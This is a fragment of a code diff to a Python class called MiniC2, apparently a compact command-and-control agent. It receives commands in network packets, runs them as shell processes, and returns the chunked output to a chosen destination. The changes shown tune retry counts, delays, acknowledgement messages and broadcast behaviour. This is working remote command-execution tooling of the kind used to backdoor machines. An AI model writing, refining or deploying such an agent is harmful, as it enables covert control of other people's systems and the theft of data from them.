@@ -65,16 +65,14 @@ class MiniC2:
         self,
         text: str,
         destination_id: Optional[str] = None,
-        repeats: int = 3,
-        delay: float = 1.0,
+        repeats: int = 1,
+        delay: float = 0.2,
         also_broadcast: bool = False,
     ) -> None:
         for attempt in range(repeats):
             self._send_text(text, destination_id=destination_id)
             if attempt < repeats - 1:
                 time.sleep(delay)
-        if also_broadcast:
-            self._send_text(text)
 
     def _on_receive(self, packet, interface) -> None:
         decoded = packet.get("decoded", {})
@@ -122,11 +120,6 @@ class MiniC2:
     def _execute_and_respond(self, command: str, destination_id: Optional[str]) -> None:
         with self._command_lock:
             cmd_id = str(int(time.time() * 1000))
-            ack = ACK_TEMPLATE.format(cmd_id=cmd_id, host=self.host, command=command)
-            self._send_text(ack, destination_id=destination_id)
-
-            time.sleep(3.0)
-
             result = self._run_command(command)
             self.logger.info("Command result for %s: exit=%s", cmd_id, result[2])
             chunks = self._format_output(cmd_id, result)
@@ -135,10 +128,17 @@ class MiniC2:
                 self._send_text(f"MSG-ID:{cmd_id}\nOutput:\n<no output>", destination_id=destination_id)
                 return
 
+            if len(chunks) == 1:
+                first_chunk = chunks.popleft()
+                self._send_text_repeated(first_chunk, destination_id=destination_id)
+                return
+
+            ack = ACK_TEMPLATE.format(cmd_id=cmd_id, host=self.host, command=command)
+            self._send_text(ack, destination_id=destination_id)
+            time.sleep(0.1)
             first_chunk = chunks.popleft()
-            self._send_text_repeated(first_chunk, destination_id=destination_id, also_broadcast=True)
-            if chunks:
-                self.output_buffer.store(cmd_id, chunks)
+            self._send_text_repeated(first_chunk, destination_id=destination_id)
+            self.output_buffer.store(cmd_id, chunks)
 
     def _run_command(self, command: str) -> Tuple[str, str, int]:
         process = subprocess.Popen(
